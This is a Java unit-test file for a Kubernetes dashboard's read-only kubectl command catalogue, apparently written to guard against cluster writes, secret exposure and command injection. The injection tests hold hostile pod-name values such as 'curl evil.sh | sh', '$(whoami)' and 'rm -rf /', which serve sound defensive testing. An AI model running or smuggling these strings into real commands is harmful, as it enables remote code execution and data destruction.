package io.kubastion.kubectl;

import io.kubastion.config.KubastionProperties;
import org.junit.jupiter.api.Test;

import java.util.List;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertThrows;
import static org.junit.jupiter.api.Assertions.assertTrue;

/**
 * The catalogue is the security boundary for everything the UI can trigger.
 * These tests guard the two properties that matter: nothing in it writes to the
 * cluster, and nothing a browser sends can become part of a command line.
 */
class ClusterCommandTest {

    private KubectlCommands commands(String namespace, String context) {
        return new KubectlCommands(new KubastionProperties(
                new KubastionProperties.Terminal("", List.of()),
                new KubastionProperties.Kubectl("kubectl", namespace, context),
                new KubastionProperties.Monitor(3, 15, 2)));
    }

    private String build(ClusterCommand command, String pod, Integer tail) {
        return commands("demo", "").build(command, pod, tail);
    }

    @Test
    void everyCommandIsReadOnly() {
        // The one rule that must never quietly stop being true.
        List<String> forbidden = List.of("apply", "delete", "edit", "patch", "scale",
                "replace", "create", "exec", "cp", "drain", "cordon", "rollout", "annotate", "label");

        for (ClusterCommand command : ClusterCommand.all()) {
            String line = build(command, "some-pod", 200);
            for (String verb : forbidden) {
                assertFalse(line.contains(" " + verb + " "),
                        () -> command.id() + " must not run " + verb + ": " + line);
            }
        }
    }

    @Test
    void noCommandCanRevealASecretValue() {
        // Listing secrets shows names and types. Reading one would print a live
        // credential into a browser tab, so no command may ask for its contents.
        for (ClusterCommand command : ClusterCommand.all()) {
            String line = build(command, "some-pod", 200);
            boolean readsASecret = line.contains("secret") && (line.contains("-o yaml")
                    || line.contains("-o json") || line.contains("jsonpath"));
            assertFalse(readsASecret, () -> command.id() + " could expose a secret: " + line);
        }
    }

    @Test
    void podCommandsCarryTheNamespaceAndThePod() {
        String line = build(ClusterCommand.POD_DESCRIBE, "api-gateway-7d9f8b6c4-2xk9p", null);

        assertEquals("kubectl -n demo describe pod api-gateway-7d9f8b6c4-2xk9p", line);
    }

    @Test
    void logsAreAlwaysBounded() {
        String line = build(ClusterCommand.POD_LOGS, "api", 500);

        assertTrue(line.contains("--tail=500"), line);
    }

    @Test
    void anAbsurdTailIsPulledBackIntoRange() {
        assertTrue(build(ClusterCommand.POD_LOGS, "api", 10_000_000).contains("--tail=5000"));
        assertTrue(build(ClusterCommand.POD_LOGS, "api", -4).contains("--tail=10"));
        assertTrue(build(ClusterCommand.POD_LOGS, "api", null).contains("--tail=200"));
    }

    @Test
    void previousLogsAreTheOnesFromBeforeTheRestart() {
        assertTrue(build(ClusterCommand.POD_LOGS_PREVIOUS, "api", 200).contains("--previous"));
    }

    @Test
    void nodesAreNotNamespaced() {
        String line = build(ClusterCommand.CLUSTER_NODES, null, null);

        assertFalse(line.contains("-n demo"), line);
        assertEquals("kubectl get nodes -o wide", line);
    }

    @Test
    void scopeDecidesWhetherTheNamespaceIsPassed() {
        // A cluster command with -n would silently be scoped to one namespace;
        // a namespace command without it would hit whatever the remote default is.
        for (ClusterCommand command : ClusterCommand.all()) {
            String line = build(command, "some-pod", 100);
            boolean namespaced = line.contains(" -n demo ");
            if (command.scope() == ClusterCommand.Scope.CLUSTER) {
                assertFalse(namespaced, () -> command.id() + " must not be namespaced: " + line);
            } else {
                assertTrue(namespaced, () -> command.id() + " must be namespaced: " + line);
            }
        }
    }

    @Test
    void everyPodCommandNamesThePodAndNothingElseDoes() {
        for (ClusterCommand command : ClusterCommand.all()) {
            String line = build(command, "target-pod-x1", 100);
            assertEquals(command.needsPod(), line.contains("target-pod-x1"),
                    () -> command.id() + ": " + line);
        }
    }

    @Test
    void quickCommandsAreTheRibbonButtons() {
        // The ribbon's front-row buttons are built from this flag (the rest fold
        // into "More"); pod commands all live in the row menu, so none are quick.
        // A change here is a visible UI change — make it deliberate.
        List<String> quick = ClusterCommand.all().stream()
                .filter(ClusterCommand::quick).map(ClusterCommand::id).toList();

        assertEquals(List.of(
                "ns-events", "ns-workloads", "ns-services", "ns-configmaps", "ns-secrets", "ns-top-pods",
                "cluster-nodes", "cluster-top-nodes", "cluster-namespaces"), quick);
    }

    @Test
    void thePodMenuOffersEveryPodCommand() {
        // The three-dots menu is built from every needsPod command, in order.
        List<String> podCommands = ClusterCommand.all().stream()
                .filter(ClusterCommand::needsPod).map(ClusterCommand::id).toList();

        assertEquals(List.of(
                "pod-logs", "pod-logs-previous", "pod-describe", "pod-events",
                "pod-top", "pod-status", "pod-yaml", "pod-json"), podCommands);
    }

    @Test
    void withoutANamespaceEveryNamespacedCommandDropsTheFlag() {
        // Empty namespace = the session default, so no -n is passed anywhere —
        // pod and namespace commands alike run where you already are.
        for (ClusterCommand command : ClusterCommand.all()) {
            String line = commands("", "").build(command, "some-pod", 100);
            assertFalse(line.contains(" -n "), () -> command.id() + " leaked -n: " + line);
        }
        assertEquals("kubectl describe pod api",
                commands("", "").build(ClusterCommand.POD_DESCRIBE, "api", null));
    }

    @Test
    void theContextIsCarriedWhenConfigured() {
        String line = commands("demo", "cluster-a").build(ClusterCommand.NS_EVENTS, null, null);

        assertTrue(line.startsWith("kubectl --context=cluster-a -n demo"), line);
    }

    @Test
    void aPodNameTryingToInjectIsRejected() {
        assertThrows(IllegalArgumentException.class,
                () -> build(ClusterCommand.POD_LOGS, "api; curl evil.sh | sh", 200));
        assertThrows(IllegalArgumentException.class,
                () -> build(ClusterCommand.POD_DESCRIBE, "api $(whoami)", null));
        assertThrows(IllegalArgumentException.class,
                () -> build(ClusterCommand.POD_YAML, "api`id`", null));
    }

    @Test
    void aPodCommandWithoutAPodIsRejected() {
        assertThrows(IllegalArgumentException.class,
                () -> build(ClusterCommand.POD_LOGS, null, 200));
        assertThrows(IllegalArgumentException.class,
                () -> build(ClusterCommand.POD_LOGS, "   ", 200));
    }

    @Test
    void namespaceCommandsIgnoreAPodNameEntirelyRatherThanSplicingItIn() {
        String line = build(ClusterCommand.NS_SECRETS, "whatever; rm -rf /", null);

        assertEquals("kubectl -n demo get secrets", line);
    }

    @Test
    void idsAreStableAndUrlSafe() {
        for (ClusterCommand command : ClusterCommand.all()) {
            assertTrue(command.id().matches("[a-z][a-z0-9-]*"), command.id());
            assertEquals(command, ClusterCommand.byId(command.id()).orElseThrow());
        }
    }

    @Test
    void anUnknownIdResolvesToNothing() {
        assertTrue(ClusterCommand.byId("delete-everything").isEmpty());
    }
}
